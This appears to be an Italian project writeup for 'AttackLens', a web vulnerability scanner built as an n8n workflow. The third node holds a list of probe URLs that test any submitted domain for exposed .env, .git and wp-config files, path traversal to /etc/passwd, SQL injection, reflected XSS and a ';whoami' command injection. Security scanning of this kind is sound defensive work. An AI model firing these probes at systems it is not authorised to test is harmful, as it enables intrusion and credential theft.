# AttackLens

Nello sviluppo dell'utility mi sono servito di un piccolo **file in php** per la gestione di **frontend** e di un **workflow in n8n come backend.**

## Dettaglio del Codice di Attacco

**Nodo 1**
**Imposto un link di tipo webhook in grado di ricevere le richieste**
il link webhook è un indirizzo con la capacità di rimanere in ascolto e in attesa di recezione di dati (in questo caso col metodo POST).

```json
     {
      "parameters": {
        "httpMethod": "POST",
        "path": "723b643c-7a77-4c7e-92b9-05e523e5b8ea",
        "responseMode": "responseNode",
        "options": {}
      },
      "type": "n8n-nodes-base.webhook",
      "typeVersion": 2.1,
      "position": [
        -944,
        -160
      ],
      "id": "c0bf9e42-c5e7-4d4d-a7f0-33c9d4ef8f16",
      "name": "Webhook1",
      "webhookId": "723b643c-7a77-4c7e-92b9-05e523e5b8ea"
    }
    ```

**Nodo 2**
**Controllo i dati ricevuti per la richiesta**
con il seguente codice attraverso i const rawTarget e rawEmail reperisco i dati ricevuti salvandoli. Successivamente attraverso i replace ripulisco il dato del target (o dominio) da https e gli slash. Poi dichiaro le costanti ipRegex, domainRegex, emailRegex per controllare la formazione dei dati. Infine applico le regole definite, gestisco gli errori e restituisco i dati.

```json
    {
      "parameters": {
        "jsCode": "const body = $('Webhook1').first().json.body || $('Webhook1').first().json;
        \nconst rawTarget = body.target ? body.target.trim() : '';
        \nconst rawEmail = body.email ? body.email.trim() : '';
        
        \n\nlet cleanTarget = rawTarget\n  .replace(/^https?:\\/\\//i, '')\n  .replace(/\\/.*$/, '');
        
        \n\nconst ipRegex = /^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/;
        \nconst domainRegex = /^(?:[a-zA-Z0-9](?:[a-zA-Z0-9\\-]{0,61}[a-zA-Z0-9])?\\.)+[a-zA-Z]{2,}$/;
        \nconst emailRegex = /^[^\\s@]+@[^\\s@]+\\.[^\\s@]+$/;\n\nconst isValidTarget = cleanTarget && (ipRegex.test(cleanTarget) || domainRegex.test(cleanTarget));
        \nconst isValidEmail = rawEmail && emailRegex.test(rawEmail);
        
        \n\nif (!isValidTarget) {
            \n  throw new Error(`Target non valido: \"${rawTarget}\".`);
            
            \n}\nif (!isValidEmail) {
                \n  throw new Error(`Indirizzo email non valido: \"${rawEmail}\".`);
                
                
                \n}\n\nreturn [{
                    \n  json: {
                        \n    target: cleanTarget,
                        \n    original_target: rawTarget,
                        \n    email: rawEmail,
                        \n    validated_at: new Date().toISOString()
                        \n  }
                        \n}];"
      },
      "type": "n8n-nodes-base.code",
      "typeVersion": 2,
      "position": [
        -768,
        -160
      ],
      "id": "c8872c64-2bbc-45e8-88a7-9da921b088e4",
      "name": "Check Richiesta1"
    }
    ```

**Nodo 3**
**Simulazione di Attacchi al Dominio o IP**
dopo aver recuperato i dati di email e target attraverso il seguente modulo imposto la simulazione di attacchi.
1. Attraverso il https://${target} invio una richiesta alla home page per verificare che il server risponda includendo l'header HTTP.
2. Attraverso il https://${target}/.env tento di scaricare file .env solitamente usati per memorizzare chiavi API, password etc.
3. Attraverso https://${target}/.git/HEAD verifico se è presente e accessibile la cartella nascosta di git che contiene solitamente tutto il codice del sito.
4. Attraverso https://${target}/backup.sql cerco una possibile copia di backup nella cartella pubblica.
5. Attraverso https://${target}/config.php cerco di accedere al file di configurazione generico.
6. Attraverso https://${target}/wp-config.php cerco il file di configurazione di Wordpress che contiene credenziali di accesso e controlla che il login in Wordpress non sia pubblico.
7. Attraverso https://${target}/swagger-ui.html controllo se la documentazione API è pubblica, ciò fornirebbe una mappa dettagliata delle rotte possibili al server.
8. Attraverso di nuovo https://${target} esamino che la risposta del server non riveli l'infrastruttura (tipo l'utilizzo di Apache, Nginx etc).
9. Attraverso https://${target}/../../../../etc/passwd risalgo all'albero delle cartelle del server tentando di leggere i file con password su Linux.
10. Attraverso https://${target}/..%5c..%5c..%5cwindows%5cwin.ini eseguo lo stesso controllo del punto 9 ma per la controparte Windows.
11. Attraverso https://${target}/?id=1'%20OR%20'1'='1 invio una sintassi tipica per i database per verificare se è vulnerabile ad attacchi e restituisce errori.
12. Attraverso https://${target}/?search=%3Cscript%3Econsole.log('XSS_TEST')%3C%2Fscript%3E inietto nel codice JS all'interno del parametro search per vedere se il server restituisce senza sanitizzare.
13. Attraverso https://${target}/?cmd=127.0.0.1%3Bwhoami tento di eseguire un comando direttamente nel cmd e verifico se il server lo esegue direttamente.
14. Attraverso https://${target}/uploads/ tento di accedere alla cartella dei caricamenti.
15. Attraverso di nuovo https://${target} verifico che la connssione sia sicura attraverso l'header HTTPS.

```json
    {
      "parameters": {
        "jsCode": "
        \nconst target = $('Check Richiesta1').first().json.target;
        \nconst email = $('Check Richiesta1').first().json.email;

        \n\nconst testList = [
            \n  { tipo: 'HEADER_SECURITY', nome: 'Controllo Header di Sicurezza HTTP', url: `https://${target}`, metodo: 'GET' },
            \n  { tipo: 'EXPOSED_FILE', nome: 'File di Configurazione (.env)', url: `https://${target}/.env`, metodo: 'GET' },
            \n  { tipo: 'EXPOSED_FILE', nome: 'Repository Git Esposto (.git/HEAD)', url: `https://${target}/.git/HEAD`, metodo: 'GET' },
            \n  { tipo: 'EXPOSED_FILE', nome: 'Backup Database Esposto (.sql)', url: `https://${target}/backup.sql`, metodo: 'GET' },
            \n  { tipo: 'EXPOSED_FILE', nome: 'File di Configurazione (config.php)', url: `https://${target}/config.php`, metodo: 'GET' },
            \n  { tipo: 'EXPOSED_FILE', nome: 'File wp-config.php (WordPress)', url: `https://${target}/wp-config.php`, metodo: 'GET' },
            \n  { tipo: 'API_SWAGGER', nome: 'Documentazione API / Swagger Esposta', url: `https://${target}/swagger-ui.html`, metodo: 'GET' },
            \n  { tipo: 'INFO_DISCLOSURE', nome: 'Information Disclosure (Header tecnologici)', url: `https://${target}`, metodo: 'GET' },
            \n  { tipo: 'PATH_TRAVERSAL_LINUX', nome: 'Path Traversal Linux (/etc/passwd)', url: `https://${target}/../../../../etc/passwd`, metodo: 'GET' },
            \n  { tipo: 'PATH_TRAVERSAL_WIN',   nome: 'Path Traversal Windows (win.ini)', url: `https://${target}/..%5c..%5c..%5cwindows%5cwin.ini`, metodo: 'GET' },
            \n  { tipo: 'SQL_INJECTION', nome: 'SQL Injection (errori nel body)', url: `https://${target}/?id=1'%20OR%20'1'='1`, metodo: 'GET' },
            \n  { tipo: 'XSS_REFLECTED', nome: 'Cross-Site Scripting Riflesso (XSS)', url: `https://${target}/?search=%3Cscript%3Econsole.log('XSS_TEST')%3C%2Fscript%3E`, metodo: 'GET' },
            \n  { tipo: 'COMMAND_INJECTION', nome: 'Command Injection (OS)', url: `https://${target}/?cmd=127.0.0.1%3Bwhoami`, metodo: 'GET' },
            \n  { tipo: 'DIRECTORY_LISTING', nome: 'Directory Listing (cartella /uploads/)', url: `https://${target}/uploads/`, metodo: 'GET' },
            \n  { tipo: 'SSL_CHECK', nome: 'Verifica HTTPS e Certificato SSL', url: `https://${target}`, metodo: 'GET' }
            \n];\n\nreturn testList.map(test => ({
                \n  json: {
                    \n    ...test,
                    \n    target: target,
                    \n    email: email\n  }
                    \n}));
                    \n"
      },
      "type": "n8n-nodes-base.code",
      "typeVersion": 2,
      "position": [
        -608,
        -160
      ],
      "id": "57d7674c-8eca-4946-928a-b4721ba25d5e",
      "name": "Simulate Attack1"
    }
    ```
    